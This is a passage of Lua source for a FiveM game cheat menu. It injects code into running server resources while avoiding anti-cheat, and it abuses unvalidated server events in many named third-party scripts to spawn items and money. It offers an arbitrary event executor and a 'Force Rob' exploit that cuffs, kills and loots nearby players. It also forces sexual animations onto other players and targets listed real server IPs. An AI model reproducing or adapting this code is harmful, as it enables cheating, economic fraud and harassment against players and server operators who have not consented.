                            ClearPedSecondaryTask(playerPed)
                            DetachEntity(playerPed, true, false)
                            BlowDriver = false
                        else
                            BlowDriver = true
                            if not HasAnimDictLoaded("mini@prostitutes@sexnorm_veh") then
                                RequestAnimDict("mini@prostitutes@sexnorm_veh")
                                while not HasAnimDictLoaded("mini@prostitutes@sexnorm_veh") do
                                    Wait(0)
                                end
                            end

                            TaskPlayAnim(PlayerPedId(), "mini@prostitutes@sexnorm_veh", "bj_loop_prostitute", 8.0, -8.0, 100000, 33, 0, false, false, false)
                        end
                    end
                end

                qPLWtXYzKm()
            ]])
        end)

        MachoMenuButton(EmoteTabSections[1], "Meditate On Them", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function XYqLvTzWKo()
                    local closestPlayer, closestDistance = nil, math.huge
                    local playerPed = PlayerPedId()
                    local playerCoords = GetEntityCoords(playerPed)

                    for _, playerId in ipairs(GetActivePlayers()) do
                        local targetPed = GetPlayerPed(playerId)
                        if targetPed ~= playerPed then
                            local targetCoords = GetEntityCoords(targetPed)
                            local distance = #(playerCoords - targetCoords)

                            if distance < closestDistance then
                                closestDistance = distance
                                closestPlayer = playerId
                            end
                        end
                    end

                    if not HasAnimDictLoaded("rcmcollect_paperleadinout@") then
                        RequestAnimDict("rcmcollect_paperleadinout@")
                        while not HasAnimDictLoaded("rcmcollect_paperleadinout@") do
                            Wait(0)
                        end
                    end

                    AttachEntityToEntity(PlayerPedId(), GetPlayerPed(closestPlayer), 57005, 0, -0.12, 1.53, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                    TaskPlayAnim(PlayerPedId(), "rcmcollect_paperleadinout", "meditiate_idle", 8.0, -8.0, 9999999, 33, 9999999, false, false, false)
                    TaskSetBlockingOfNonTemporaryEvents(PlayerPedId(), true)
                end

                XYqLvTzWKo()
            ]])
        end)

        local EmoteDropDownChoice = 0
        local EmoteToggle = false
        local EmoteThread = nil

        local EmoteMap = {
            [0] = "slapped",
            [1] = "punched",
            [2] = "receiveblowjob",
            [3] = "GiveBlowjob",
            [4] = "headbutted",
            [5] = "hug4",
            [6] = "streetsexfemale",
            [7] = "streetsexmale",
            [8] = "pback2",
            [9] = "carry3",
            [10] = ".....gta298",
            [11] = ".....gta304",
            [12] = ".....gta284"

        }

        MachoMenuDropDown(EmoteTabSections[2], "Emote Choice", function(index)
            EmoteDropDownChoice = index
        end,
            "Slapped",
            "Punched",
            "Give BJ",
            "Recieve BJ",
            "Headbutt",
            "Hug",
            "StreetSexFemale",
            "StreetSexMale",
            "Piggyback",
            "Carry",
            "Butt Rape",
            "Amazing Head",
            "Lesbian Scissors"
        )

        MachoMenuButton(EmoteTabSections[2], "Give Emote", function()
            local emote = EmoteMap[EmoteDropDownChoice]
            if emote then
                MachoInjectResource2(3, CheckResource("monitor") and "monitor" or "any", string.format([[
                    local function KmTpqXYzLv()
                        local Rk3uVnTZpxf7Q = TriggerEvent
                        Rk3uVnTZpxf7Q("ClientEmoteRequestReceive", "%s", true)
                    end

                    KmTpqXYzLv()
                ]], emote))
            end
        end)

        -- Event Tab
        InputBoxHandle = MachoMenuInputbox(EventTabSections[1], "Name:", "...")
        InputBoxHandle2 = MachoMenuInputbox(EventTabSections[1], "Amount:", "...")

        MachoMenuButton(EventTabSections[1], "Spawn", function()
            local ItemName = MachoMenuGetInputbox(InputBoxHandle)
            local ItemAmount = MachoMenuGetInputbox(InputBoxHandle2)

            if ItemName and ItemName ~= "" and ItemAmount and tonumber(ItemAmount) then
                local Amount = tonumber(ItemAmount)
                local resourceActions = {
                    ["ak47_drugmanager"] = function()
                        MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                            local function efjwr8sfr()
                                TriggerServerEvent('ak47_drugmanager:pickedupitem', "]] .. ItemName .. [[", "]] .. ItemName .. [[", ]] .. ItemAmount .. [[)
                            end

                            efjwr8sfr()
                        ]])
                    end,

                    ["bobi-selldrugs"] = function()
                        MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                            local function safdagwawe()
                                TriggerServerEvent('bobi-selldrugs:server:RetrieveDrugs', "]] .. ItemName .. [[", ]] .. ItemAmount .. [[)
                            end

                            safdagwawe()
                        ]])
                    end,

                    ["mc9-taco"] = function()
                        MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                            local function cesfw33w245d()
                                TriggerServerEvent('mc9-taco:server:addItem', "]] .. ItemName .. [[", ]] .. ItemAmount .. [[)
                            end

                            cesfw33w245d()
                        ]])
                    end,

                    ["bobi-selldrugs"] = function()
                        MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                            local function safdagwawe()
                                TriggerServerEvent('bobi-selldrugs:server:RetrieveDrugs', "]] .. ItemName .. [[", ]] .. ItemAmount .. [[)
                            end

                            safdagwawe()
                        ]])
                    end,

                    ["wp-pocketbikes"] = function()
                        MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                            local function awdfaweawewaeawe()
                                TriggerServerEvent("wp-pocketbikes:server:AddItem", "]] .. ItemName .. [[", ]] .. ItemAmount .. [[)
                            end

                            awdfaweawewaeawe()
                        ]])
                    end,

                    ["solos-jointroll"] = function()
                        MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                            local function weawasfawfasfa()
                                TriggerServerEvent('solos-joints:server:itemadd', "]] .. ItemName .. [[", ]] .. ItemAmount .. [[)
                            end

                            weawasfawfasfa()
                        ]])
                    end,

                    ["angelicxs-CivilianJobs"] = function()
                        MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                            local function safafawfaws()
                                TriggerServerEvent('angelicxs-CivilianJobs:Server:GainItem', "]] .. ItemName .. [[", ]] .. ItemAmount .. [[)
                            end

                            safafawfaws()
                        ]])
                    end,

                    ["ars_whitewidow_v2"] = function() 
                        MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                            local function sDfjMawT34()
                                TriggerServerEvent('ars_whitewidow_v2:Buyitem', {
                                    items = {
                                        {
                                            id = "]] .. ItemName .. [[",
                                            image = "JTG",
                                            name = "JTG",
                                            page = 1,
                                            price = 500,
                                            quantity = ]] .. ItemAmount .. [[,
                                            stock = 999999999999999999999999999,
                                            totalPrice = 0
                                        }
                                    },
                                    method = "cash",
                                    total = 0
                                }, "cash")
                            end

                            sDfjMawT34()
                        ]])
                    end,

                    ["ars_cannabisstore_v2"] = function()
                        MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                        local function sDfjMawT34()
                            TriggerServerEvent("ars_cannabisstore_v2:Buyitem", {
                                items = {
                                    {
                                        id = "]] .. ItemName .. [[",
                                        image = "JTG",
                                        name = "JTG",
                                        page = JTG,
                                        price = 0,
                                        quantity = ]] .. ItemAmount .. [[,
                                        stock = 10000000000000,
                                        totalPrice = 0
                                    }
                                },
                                method = "JTG",
                                total = 0
                            }, "cash")
                        end

                        sDfjMawT34()
                        ]])
                    end,

                    ["ars_hunting"] = function()
                        MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                            local function sDfjMawT34()
                                TriggerServerEvent("ars_hunting:sellBuyItem",  {
                                    item = "]] .. ItemName .. [[",
                                    price = 1,
                                    quantity = ]] .. ItemAmount .. [[,
                                    buy = true
                                })
                            end

                            sDfjMawT34()
                        ]])
                    end,

                    ["boii-whitewidow"] = function() -- Dolph Land only
                        local ServerIP = {
                            "217.20.242.24:30120"
                        }

                        local function IsAllowedIP(CurrentIP)
                            for _, ip in ipairs(ServerIP) do
                                if CurrentIP == ip then
                                    return true
                                end
                            end
                            return false
                        end

                        local CurrentIP = GetCurrentServerEndpoint()

                        if IsAllowedIP(CurrentIP) then
                            MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                                local function sDfjMawT34()
                                    TriggerServerEvent('boii-whitewidow:server:AddItem', ']] .. ItemName .. [[', ]] .. ItemAmount .. [[)
                                end

                                sDfjMawT34()
                            ]])
                        end
                    end,

                    ["codewave-cannabis-cafe"] = function() -- Neighborhood
                        local ServerIP = {
                            "185.244.106.45:30120"
                        }

                        local function IsAllowedIP(CurrentIP)
                            for _, ip in ipairs(ServerIP) do
                                if CurrentIP == ip then
                                    return true
                                end
                            end
                            return false
                        end

                        local CurrentIP = GetCurrentServerEndpoint()

                        if IsAllowedIP(CurrentIP) then
                            MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                                local function sDfjMawT34()
                                    TriggerServerEvent("cannabis_cafe:giveStockItems", { item = "]] .. ItemName .. [[", newItem = "JTG", pricePerItem = 0 }, ]] .. ItemAmount .. [[)
                                end

                                sDfjMawT34()
                            ]])
                        end
                    end,

                    ["snipe-boombox"] = function()
                        MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                            local function sDfjMawT34()
                                TriggerServerEvent("snipe-boombox:server:pickup", ]] .. ItemAmount .. [[, vector3(0.0, 0.0, 0.0), "]] .. ItemName .. [[")
                            end

                            sDfjMawT34()
                        ]])
                    end,

                    ["devkit_bbq"] = function()
                        MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                            local function sDfjMawT34()
                                TriggerServerEvent('devkit_bbq:addinv', ']] .. ItemName .. [[', ]] .. ItemAmount .. [[)
                            end

                            sDfjMawT34()
                        ]])
                    end,

                    ["mt_printers"] = function()       
                        MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[  
                            local function sDfjMawT34()
                                TriggerServerEvent('__ox_cb_mt_printers:server:itemActions', "mt_printers", "mt_printers:server:itemActions:JTG", "]] .. ItemName .. [[", "add")
                            end

                            sDfjMawT34()
                        ]])
                    end,

                    ["WayTooCerti_3D_Printer"] = function()       
                        MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[ 
                            local function ZxUwQsErTy12()
                                TriggerServerEvent('waytoocerti_3dprinter:CompletePurchase', ']] .. ItemName .. [[', ]] .. ItemAmount .. [[)
                            end
                            ZxUwQsErTy12()
                        ]])
                    end,

                    ["pug-fishing"] = function()
                        MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                            local function MnBvCxZlKjHgFd23()
                                TriggerServerEvent('Pug:server:GiveFish', "]] .. ItemName .. [[", ]] .. ItemAmount .. [[)
                            end
                            MnBvCxZlKjHgFd23()
                        ]])
                    end,

                    -- TriggerServerEvent("apex_tacofarmer:client:addItem", "item", amount) Premier RP Backup

                    ["apex_koi"] = function()
                        MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                            local function ErTyUiOpAsDfGh45()
                                TriggerServerEvent("apex_koi:client:addItem", "]] .. ItemName .. [[", ]] .. ItemAmount .. [[)
                            end
                            ErTyUiOpAsDfGh45()
                        ]])
                    end,

                    ["apex_peckerwood"] = function()
                        MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                            local function UiOpAsDfGhJkLz67()
                                TriggerServerEvent("apex_peckerwood:client:addItem", "]] .. ItemName .. [[", ]] .. ItemAmount .. [[)
                            end
                            UiOpAsDfGhJkLz67()
                        ]])
                    end,

                    ["apex_thetown"] = function()
                        MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                            local function PlMnBvCxZaSdFg89()
                                TriggerServerEvent("apex_thetown:client:addItem", "]] .. ItemName .. [[", ]] .. ItemAmount .. [[)
                            end
                            PlMnBvCxZaSdFg89()
                        ]])
                    end,

                    ["codewave-bbq"] = function()
                        MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                            local function QwErTyUiOpAsDf90()
                                for i = 1, ]] .. ItemAmount .. [[ do
                                    TriggerServerEvent('placeProp:returnItem', "]] .. ItemName .. [[")
                                    Wait(1)
                                end
                            end
                            QwErTyUiOpAsDf90()
                        ]])
                    end,

                    ["brutal_hunting"] = function()
                        MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                            local function TyUiOpAsDfGhJk01()
                                Wait(1)
                                TriggerServerEvent("brutal_hunting:server:AddItem", {
                                    {
                                        amount = "]] .. ItemAmount .. [[",
                                        item = "]] .. ItemName .. [[",
                                        label = "J",
                                        price = 0
                                    }
                                })
                            end
                            TyUiOpAsDfGhJk01()
                        ]])
                    end,

                    ["xmmx_bahamas"] = function()
                        MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                            local function JkLzXcVbNmQwEr02()
                                TriggerServerEvent("xmmx-bahamas:Making:GetItem", "]] .. ItemName .. [[", {
                                    amount = ]] .. ItemAmount .. [[,
                                    cash = {
                                    }
                                })
                            end
                            JkLzXcVbNmQwEr02()
                        ]])
                    end,

                    ["ak47_drugmanager"] = function() -- Drilltime NYC only
                        local ServerIP = { "162.222.16.18:30120" }

                        local function IsAllowedIP(CurrentIP)
                            for _, ip in ipairs(ServerIP) do
                                if CurrentIP == ip then return true end
                            end
                            return false
                        end

                        local CurrentIP = GetCurrentServerEndpoint()

                        if IsAllowedIP(CurrentIP) then
                            MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                                local function aKf48SlWd()
                                    Wait(1)
                                    TriggerServerEvent('ak47_drugmanager:pickedupitem', "]] .. ItemName .. [[", "]] .. ItemName .. [[", ]] .. ItemAmount .. [[)
                                end
                                aKf48SlWd()
                            ]])
                        end
                    end,

                    ["xmmx_letscookplus"] = function()
                        MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                            local function QwErTy123()
                                Wait(1)
                                TriggerServerEvent('xmmx_letscookplus:server:BuyItems', {
                                    totalCost = 0,
                                    cart = {
                                        {name = "]] .. ItemName .. [[", quantity = ]] .. ItemAmount .. [[}
                                    }
                                }, "bank")
                            end
                            QwErTy123()
                        ]])
                    end,

                    ["xmmx-letscamp"] = function() -- Every server but Grizzly World.
                        local BlockedIPs = { "66.70.153.70:80" }

                        local function IsBlockedIP(CurrentIP)
                            for _, ip in ipairs(BlockedIPs) do
                                if CurrentIP == ip then return true end
                            end
                            return false
                        end

                        local CurrentIP = GetCurrentServerEndpoint()

                        if not IsBlockedIP(CurrentIP) then
                            local code = string.format([[ 
                                local function XcVbNm82()
                                    Wait(1)
                                    TriggerServerEvent('xmmx-letscamp:Cooking:GetItem', ']] .. ItemName .. [[', {
                                        ["%s"] = {
                                            ['lccampherbs'] = 0,
                                            ['lccampmeat'] = 0,
                                            ['lccampbutta'] = 0
                                        },
                                        ['amount'] = ]] .. ItemAmount .. [[
                                    })
                                end
                                XcVbNm82()
                            ]], ItemName)

                            MachoInjectResource2(3, "xmmx-letscamp", code)
                        end
                    end,

                    ["wasabi_mining"] = function()
                        MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                            local function MzXnJqKs88()
                                local item = {
                                    difficulty = { "medium", "medium" },
                                    item = "]] .. ItemName .. [[",
                                    label = "JTG",
                                    price = { 110, 140 }
                                }

                                local index = 3
                                local amount = ]] .. ItemAmount .. [[

                                for i = 1, amount do
                                    Wait(1)
                                    TriggerServerEvent('wasabi_mining:mineRock', item, index)
                                end
                            end
                            MzXnJqKs88()
                        ]])
                    end,

                    ["apex_bahama"] = function() -- 17th Street
                        local ServerIP = { "89.31.216.161:30120" }

                        local function IsAllowedIP(CurrentIP)
                            for _, ip in ipairs(ServerIP) do
                                if CurrentIP == ip then return true end
                            end
                            return false
                        end

                        local CurrentIP = GetCurrentServerEndpoint()

                        if IsAllowedIP(CurrentIP) then
                            MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                                local function PlMnBv55()
                                    Wait(1)
                                    TriggerServerEvent("apex_bahama:client:addItem", "]] .. ItemName .. [[", ]] .. ItemAmount .. [[)
                                end
                                PlMnBv55()
                            ]])
                        end
                    end,

                    ["jg-mechanic"] = function() -- Sunnyside Atlanta only
                        local ServerIP = { "91.190.154.43:30120" }

                        local function IsAllowedIP(CurrentIP)
                            for _, ip in ipairs(ServerIP) do
                                if CurrentIP == ip then return true end
                            end
                            return false
                        end

                        local CurrentIP = GetCurrentServerEndpoint()

                        if IsAllowedIP(CurrentIP) then
                            MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                                local function HjKlYu89()
                                    Wait(1)
                                    TriggerServerEvent('jg-mechanic:server:buy-item', "]] .. ItemName .. [[", 0, ]] .. ItemAmount .. [[, "autoexotic", 1)
                                end
                                HjKlYu89()
                            ]])
                        end
                    end,

                    ["jg-mechanic"] = function() -- ShiestyLife RP
                        local ServerIP = { "191.96.152.17:30121" }

                        local function IsAllowedIP(CurrentIP)
                            for _, ip in ipairs(ServerIP) do
                                if CurrentIP == ip then return true end
                            end
                            return false
                        end

                        local CurrentIP = GetCurrentServerEndpoint()

                        if IsAllowedIP(CurrentIP) then
                            MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                                local function LkJfQwOp78()
                                    Wait(1)
                                    TriggerServerEvent('jg-mechanic:server:buy-item', "]] .. ItemName .. [[", 0, ]] .. ItemAmount .. [[, "TheCultMechShop", 1)
                                end
                                LkJfQwOp78()
                            ]])
                        end
                    end
                }

                local ResourceFound = false
                for ResourceName, action in pairs(resourceActions) do
                    if GetResourceState(ResourceName) == "started" then
                        action()
                        ResourceFound = true
                        break
                    end
                end 

                if not ResourceFound then
                    MachoMenuNotification("[NOTIFICATION] JTG Menu", "No Triggers Found.")
                end
            else
                MachoMenuNotification("[NOTIFICATION] JTG Menu", "Invalid Item or Amount.")
            end
        end)

        MoneyInputBox = MachoMenuInputbox(EventTabSections[2], "Amount:", "...")
    MachoMenuButton(EventTabSections[2], "Spawn Money", function()
        local ItemAmount = MachoMenuGetInputbox(MoneyInputBox)

        if ItemAmount and tonumber(ItemAmount) then
            local Amount = tonumber(ItemAmount)

            local resourceActions = {
                ["codewave-lashes-phone"] = function()
                    MachoInjectResource2(3, (CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("monitor") and "monitor") or "any", [[
                        Wait(1)
                        TriggerServerEvent('delivery:giveRewardlashes', ]] .. Amount .. [[)
                    ]])
                end,

                ["codewave-nails-phone"] = function()
                    MachoInjectResource2(3, (CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("monitor") and "monitor") or "any", [[
                        Wait(1)
                        TriggerServerEvent('delivery:giveRewardnails', ]] .. Amount .. [[)
                    ]])
                end,

                ["codewave-caps-client-phone"] = function()
                    MachoInjectResource2(3, (CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("monitor") and "monitor") or "any", [[
                        Wait(1)
                        TriggerServerEvent('delivery:giveRewardCaps', ]] .. Amount .. [[)
                    ]])
                end,

                ["codewave-wigs-v3-phone"] = function()
                    MachoInjectResource2(3, (CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("monitor") and "monitor") or "any", [[
                        Wait(1)
                        TriggerServerEvent('delivery:giveRewardWigss', ]] .. Amount .. [[)
                    ]])
                end,

                ["codewave-icebox-phone"] = function()
                    MachoInjectResource2(3, (CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("monitor") and "monitor") or "any", [[
                        Wait(1)
                        TriggerServerEvent('delivery:giveRewardiceboxs', ]] .. Amount .. [[)
                    ]])
                end,

                ["codewave-sneaker-phone"] = function()
                    MachoInjectResource2(3, (CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("monitor") and "monitor") or "any", [[
                        Wait(1)
                        TriggerServerEvent('delivery:giveRewardShoes', ]] .. Amount .. [[)
                    ]])
                end,

                ["codewave-handbag-phone"] = function()
                    MachoInjectResource2(3, (CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("monitor") and "monitor") or "any", [[
                        Wait(1)
                        TriggerServerEvent('delivery:giveRewardhandbags', ]] .. Amount .. [[)
                    ]])
                end,
            }

            local ResourceFound = false
            for ResourceName, action in pairs(resourceActions) do
                if GetResourceState(ResourceName) == "started" then
                    action()
                    ResourceFound = true
                    break
                end
            end

            if not ResourceFound then
                MachoMenuNotification("[NOTIFICATION] WizeMenu", "No Triggers Found.")
            end
        else
            MachoMenuNotification("[NOTIFICATION] WizeMenu", "Invalid Item or Amount.")
        end
    end)

        local TriggerBoxHandle = MachoMenuInputbox(EventTabSections[4], "Event:", "...")
        local TriggerEventHandle = MachoMenuInputbox(EventTabSections[4], "Type:", "...")
        local TriggerResourceHandle = MachoMenuInputbox(EventTabSections[4], "Resource:", "...")

        local FallbackResources = {
            "monitor",
            "any"
        }

        MachoMenuButton(EventTabSections[4], "Execute", function()
            local RawInput = MachoMenuGetInputbox(TriggerBoxHandle)
            local TriggerType = MachoMenuGetInputbox(TriggerEventHandle)
            local TargetResource = MachoMenuGetInputbox(TriggerResourceHandle)

            if not RawInput or RawInput == "" then return end

            local argsChunk, err = load("return function() return " .. RawInput .. " end")
            if not argsChunk then return end

            local fnOk, fnOrErr = pcall(argsChunk)
            if not fnOk or type(fnOrErr) ~= "function" then return end

            local results = { pcall(fnOrErr) }
            if not results[1] then return end

            local eventName = results[2]
            local args = {}
            for i = 3, #results do
                table.insert(args, results[i])
            end

            local function formatValue(v)
                if type(v) == "string" then
                    return string.format("%q", v)
                elseif type(v) == "number" or type(v) == "boolean" then
                    return tostring(v)
                elseif type(v) == "table" then
                    local ok, encoded = pcall(function() return json.encode(v) end)
                    return ok and string.format("json.decode(%q)", encoded) or "nil"
                else
                    return "nil"
                end
            end

            local formattedArgs = {}
            for _, v in ipairs(args) do
                table.insert(formattedArgs, formatValue(v))
            end
            local argsCode = #formattedArgs > 0 and table.concat(formattedArgs, ", ") or ""

            local triggerCode = string.format([[
                local event = %q
                local triggerType = string.lower(%q)
                local args = { %s }

                if triggerType == "server" then
                    TriggerServerEvent(event, table.unpack(args))
                else
                    TriggerEvent(event, table.unpack(args))
                end
            ]], tostring(eventName), string.lower(TriggerType or "client"), argsCode)

            local foundResource = nil

            if TargetResource and TargetResource ~= "" then
                if GetResourceState(TargetResource) == "started" then
                    foundResource = TargetResource
                end
            else
                for _, fallback in ipairs(FallbackResources) do
                    if GetResourceState(fallback) == "started" then
                        foundResource = fallback
                        break
                    end
                end
            end

            if foundResource then
                MachoInjectResource(foundResource, triggerCode)
            end
        end)

        local TriggerDropDownChoice = 0

        local TriggerMap = {
            [0] = {
                name = "[E] Force Rob",
                resource = nil,
                code = nil
            }
        }

        MachoMenuDropDown(EventTabSections[3], "Exploit Choice", function(index)
            TriggerDropDownChoice = index
        end,
            TriggerMap[0].name
        )

        MachoMenuButton(EventTabSections[3], "Execute", function()
            local trigger = TriggerMap[TriggerDropDownChoice]
            if not trigger then return end

            if TriggerDropDownChoice == 0 then
                local ActiveInventory = nil
                local Resources = {
                    "ox_inventory", "ox_doorlock", "ox_fuel", "ox_target", "ox_lib", "ox_sit", "ox_appearance"
                }

                local InventoryResources = { 
                    ox = "ox_inventory", 
                    qb = "qb-inventory"
                }

                for Key, Resource in pairs(InventoryResources) do
                    if GetResourceState(Resource) == "started" then
                        ActiveInventory = Key
                        break
                    end
                end

                for _, Resource in ipairs(Resources or {}) do
                    if GetResourceState(Resource) == "started" then
                        MachoInjectResource2(3, Resource, ([[
                            local function awt72q48dsgn()
                                local awgfh347gedhs = CreateThread
                                awgfh347gedhs(function()
                                    local dict = 'missminuteman_1ig_2'
                                    local anim = 'handsup_enter'

                                    RequestAnimDict(dict)
                                    while not HasAnimDictLoaded(dict) do
                                        Wait(0)
                                    end

                                    while true do
                                        Wait(0)
                                        if IsDisabledControlJustPressed(0, 38) then
                                            local selfPed = PlayerPedId()
                                            local selfCoords = GetEntityCoords(selfPed)
                                            local closestPlayer = -1
                                            local closestDistance = -1

                                            for _, player in ipairs(GetActivePlayers()) do
                                                local targetPed = GetPlayerPed(player)
                                                if targetPed ~= selfPed then
                                                    local coords = GetEntityCoords(targetPed)
                                                    local dist = #(selfCoords - coords)
                                                    if closestDistance == -1 or dist < closestDistance then
                                                        closestDistance = dist
                                                        closestPlayer = player
                                                    end
                                                end
                                            end

                                            if closestPlayer ~= -1 and closestDistance <= 3.0 then
                                                local ped = GetPlayerPed(closestPlayer)

                                                local CEPressPlayer = SetEnableHandcuffs
                                                local CEDeadPlayerCheck = SetEntityHealth

                                                if not IsPedCuffed(ped) then
                                                    CEPressPlayer(ped, true)
                                                    CEDeadPlayerCheck(ped, 0)
                                                    CEPressPlayer(ped, true)
                                                end

                                                if not IsEntityPlayingAnim(ped, dict, anim, 13) then
                                                    TaskPlayAnim(ped, dict, anim, 8.0, 8.0, -1, 50, 0, false, false, false)
                                                end
                                                
                                                local ActiveInventory = "%s"
                                                local serverId = GetPlayerServerId(closestPlayer)
                                                if ActiveInventory == "ox" then
                                                    TriggerEvent('ox_inventory:openInventory', 'otherplayer', serverId)
                                                elseif ActiveInventory == "qb" then
                                                    TriggerServerEvent('inventory:server:OpenInventory', 'otherplayer', serverId)
                                                end
                                            end
                                        end
                                    end
                                end)
                            end

                            awt72q48dsgn()

                        ]]):format(ActiveInventory))
                        break
                    end
                end
            else
                MachoInjectResource2(3, trigger.resource, trigger.code)
            end
        end)

        -----------------------------------------------------------------
    --  VIP TAB – Item Spawner (full knownTriggers table)
    -----------------------------------------------------------------
    ItemNameHandle   = MachoMenuInputbox(VIPTabSections[1], "Name:", "...")
    ItemAmountHandle = MachoMenuInputbox(VIPTabSections[1], "Amount:", "...")

    local giveItemState = {turn = 1, akIndex = 1}

    local function inject(code)
        MachoInjectResource("any", code)
    end

    MachoMenuButton(VIPTabSections[1], "Spawn Item", function()
        if not isKeyValid() then return end

        local ItemName   = MachoMenuGetInputbox(ItemNameHandle)
        local ItemAmount = MachoMenuGetInputbox(ItemAmountHandle)

        if not ItemName or ItemName == "" or not ItemAmount or not tonumber(ItemAmount) then
            MachoMenuNotification("[NOTIFICATION] WizeMenu", "Invalid Item or Amount.")
            return
        end

        local Amount = tonumber(ItemAmount)

        -----------------------------------------------------------------
        --  FULL knownTriggers table
        -----------------------------------------------------------------
        local knownTriggers = {
        { id = "ak_item", name = "Any Item Trigger (SAFE)", type = "item",
        res = {"ak47_whitewidowv2","ak47_cannabiscafev2","ak47_khusland","ak47_khusbites","ak47_leafnlatte",
                "ak47_qb_cannabiscafev2","ak47_qb_leafnlatte","ak47_qb_khusland","ak47_qb_khusbites","ak47_qb_whitewidowv2"},
        all = false },
        { id = "nails_money", name = "Money Trigger (SAFE)", type = "money", res = {"codewave-nails-phone"}, all = true },
        { id = "handbag_money", name = "Money Trigger (SAFE)", type = "money", res = {"codewave-handbag-phone"}, all = true },
        { id = "sneaker_money", name = "Money Trigger (SAFE)", type = "money", res = {"codewave-sneaker-phone"}, all = true },
        { id = "caps_money", name = "Money Trigger (SAFE)", type = "money", res = {"codewave-caps-client-phone"}, all = true }, -- FIXED: removed 'table ='
        { id = "generic_money", name = "Any Item Trigger (Medium Risk)", type = "item",
        res = {"ak47_qb_drugmanagerv2","ak47_drugmanagerv2"}, all = false },
        { id = "hotdog_money", name = "Money Trigger (Medium Risk)", type = "money", res = {"qb-hotdogjob"}, all = true },
        { id = "ak47_inventory", name = "Any Item Trigger (SAFE)", type = "item",
        res = {"ak47_inventory","ak47_qb_inventory"}, all = false },
        { id = "shop_purchase", name = "Palm Beach ANY ITEM (SAFE)", type = "item_only", res = {"PalmBeachMiamiMinimap"}, all = true },
        { id = "cl_pizzeria", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"CL-Pizzeria"}, all = false },
        { id = "solstice_moonshine", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"SolsticeMoonshineV2"}, all = false },
        { id = "tk_smokev2", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"Tk_smokev2"}, all = false },
        { id = "ox_cb_ws_sellshop", name = "Any Item Trigger (High Risk)", type = "item", res = {"__ox_cb_ws_sellshop"}, all = false },
        { id = "adminplus_selldrugs", name = "Any Event Trigger (High Risk)", type = "event", res = {"adminplus-selldrugs"}, all = false },
        { id = "ak47_drugmanager", name = "Any Item Trigger (SAFE)", type = "item", res = {"ak47_drugmanager"}, all = false },
        { id = "ak47_drugmanagerv2", name = "Any Item Trigger (SAFE)", type = "item", res = {"ak47_drugmanagerv2"}, all = false },
        { id = "ak47_prospecting_reward", name = "Give Scrap Items (SAFE)", type = "money", res = {"ak47_prospecting"}, all = false },
        { id = "ak47_prospecting_sell", name = "Money Trigger (SAFE)", type = "money", res = {"ak47_prospecting"}, all = false },
        { id = "ak4y_fishing del", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"ak4y-advancedFishing"}, all = false },
        { id = "ak4y_case_opening", name = "Money Trigger (Medium Risk)", type = "money", res = {"ak4y-caseOpening"}, all = false },
